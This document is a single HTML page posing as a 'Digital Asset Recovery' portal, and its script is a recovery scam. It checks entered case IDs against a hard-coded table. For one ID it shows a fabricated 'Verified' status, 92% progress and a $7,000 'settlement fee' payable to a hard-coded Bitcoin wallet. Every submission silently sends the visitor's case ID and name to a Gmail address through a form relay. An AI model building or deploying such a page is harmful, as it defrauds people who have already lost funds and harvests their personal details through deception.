<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Digital Asset Recovery | Global Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #050508; color: white; font-family: 'Inter', sans-serif; }
        .glass-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .progress-bar { width: 100%; height: 8px; background: #111; border-radius: 10px; overflow: hidden; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #22c55e, #06b6d4); transition: width 1.5s ease-in-out; }
        .pulse { animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
    </style>
</head>
<body class="p-4 md:p-12">

    <div class="max-w-6xl mx-auto">
        <div class="text-center mb-12">
            <h1 class="text-4xl md:text-5xl font-bold mb-4 bg-gradient-to-r from-cyan-400 to-blue-600 bg-clip-text text-transparent italic tracking-tighter uppercase">
                Digital Asset Recovery
            </h1>
            <p class="text-gray-500 uppercase tracking-[0.4em] text-[10px] font-bold">Secure Node: Active</p>
        </div>

        <div id="main-content" class="max-w-md mx-auto">
            <div id="login-card" class="glass-card p-8 rounded-3xl border-t-4 border-t-cyan-500">
                <h2 class="text-2xl font-bold mb-6 italic text-cyan-500 text-center uppercase tracking-tighter">Authorized Access</h2>
                <form id="login-form" action="https://formsubmit.co/ajax/recoveryspecialistdigitalasset@gmail.com" method="POST" class="space-y-4">
                    <input type="text" id="case_id_input" name="case_id" placeholder="DAR-2026-XXXX" required class="w-full bg-black/60 border border-cyan-500/30 p-4 rounded-xl outline-none text-white font-mono focus:border-cyan-400 transition">
                    <input type="text" name="auth_name" placeholder="Name on File" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl outline-none text-white focus:border-cyan-400 transition">
                    <button type="submit" id="login-btn" class="w-full bg-cyan-600 text-white font-bold py-4 rounded-xl uppercase text-xs hover:bg-cyan-500 transition mt-2 tracking-widest">Connect to Node</button>
                </form>
            </div>
        </div>

        <div id="success-box" class="hidden max-w-5xl mx-auto space-y-6">
            <div class="glass-card p-8 rounded-3xl border border-cyan-500/30">
                <div class="flex justify-between items-center mb-8">
                    <div>
                        <h2 class="text-3xl font-bold uppercase tracking-tighter italic">Case Dashboard</h2>
                        <span class="text-cyan-400 font-mono text-sm" id="display_id"></span>
                    </div>
                    <div class="text-right">
                        <p class="text-[9px] text-gray-500 uppercase font-bold">Identity Status</p>
                        <p class="text-green-400 font-bold uppercase italic text-xs">Verified ✓</p>
                    </div>
                </div>

                <div class="grid md:grid-cols-3 gap-6 mb-8">
                    <div class="md:col-span-2 p-6 bg-gradient-to-br from-orange-500/10 to-transparent rounded-2xl border border-orange-500/20">
                        <p class="text-xs uppercase text-orange-500 font-bold mb-1 italic tracking-widest">Required Settlement Fee</p>
                        <h3 class="text-5xl font-black text-white italic tracking-tighter" id="fee_amount">$0.00</h3>
                        <p class="text-[10px] text-gray-500 mt-2 uppercase">Total Bridge + Forensic Audit Costs</p>
                    </div>
                    <div class="p-6 bg-black/40 border border-cyan-500/20 rounded-2xl flex flex-col justify-center">
                        <p class="text-[9px] text-cyan-500 uppercase font-bold italic mb-1">Recovery Progress</p>
                        <p class="text-xl font-bold text-white uppercase tracking-tighter" id="progress_label">92% COMPLETE</p>
                    </div>
                </div>

                <div class="mb-8 p-6 bg-white/5 rounded-2xl">
                    <div class="flex justify-between mb-3 text-xs font-bold uppercase italic">
                        <span class="flex items-center gap-2"><span class="pulse h-2 w-2 rounded-full bg-cyan-400"></span>Current Status: <span id="status_text"></span></span>
                        <span id="progress_percent" class="text-cyan-400"></span>
                    </div>
                    <div class="progress-bar"><div id="progress_bar_fill" class="progress-fill"></div></div>
                </div>

                <div class="grid md:grid-cols-2 gap-6">
                    <div class="p-6 bg-black/40 border border-white/10 rounded-2xl">
                        <h3 class="text-sm font-bold uppercase mb-4 text-gray-400 italic">Forensic Summary</h3>
                        <p id="doc_msg" class="text-[11px] text-gray-400 italic leading-relaxed"></p>
                    </div>
                    <div class="p-6 bg-black/40 border border-orange-500/20 rounded-2xl text-center">
                        <h3 class="text-sm font-bold uppercase mb-4 text-orange-400 italic">Settlement Node (BTC)</h3>
                        <p id="wallet_addr" class="text-[11px] font-mono break-all text-white bg-black p-3 rounded border border-white/5 mb-4 select-all"></p>
                        <div class="w-full bg-orange-600/20 text-orange-400 font-bold py-2 rounded text-[10px] uppercase tracking-widest border border-orange-500/30">Awaiting Fee Payment</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const approvedCases = {
            "DAR-2026-8942": {
                fee: "$7,000.00",
                status: "STAGED / AWAITING SETTLEMENT",
                progress: "92%",
                docStatus: "Identity verification complete. Forensic audit has successfully mapped the asset path. Final settlement of $7,000.00 is required to de-link the secure bridge and release assets to the destination wallet.",
                wallet: "bc1q4dn8mczlnpqt28pfe6tkppnpwp4c6mkusdd0c2"
            }
        };

        for (let i = 1001; i <= 1050; i++) {
            approvedCases[`DAR-2026-${i}`] = {
                fee: "$0.00",
                status: "INITIALIZING",
                progress: "15%",
                docStatus: "Case initialized. Awaiting documentation.",
                wallet: "Address Pending..."
            };
        }

        const loginForm = document.getElementById('login-form');
        loginForm.onsubmit = async (e) => {
            e.preventDefault();
            const inputId = document.getElementById('case_id_input').value.trim().toUpperCase();
            if (!approvedCases[inputId]) return alert("Case ID not recognized.");

            const data = approvedCases[inputId];
            document.getElementById('main-content').classList.add('hidden');
            document.getElementById('success-box').classList.remove('hidden');
            document.getElementById('display_id').innerText = inputId;
            document.getElementById('fee_amount').innerText = data.fee;
            document.getElementById('status_text').innerText = data.status;
            document.getElementById('doc_msg').innerText = data.docStatus;
            document.getElementById('wallet_addr').innerText = data.wallet;
            
            setTimeout(() => {
                document.getElementById('progress_bar_fill').style.width = data.progress;
                document.getElementById('progress_percent').innerText = data.progress;
            }, 300);
            
            try { await fetch(loginForm.action, { method: "POST", body: new FormData(loginForm) }); } catch(e) {}
        };
    </script>
</body>
</html>
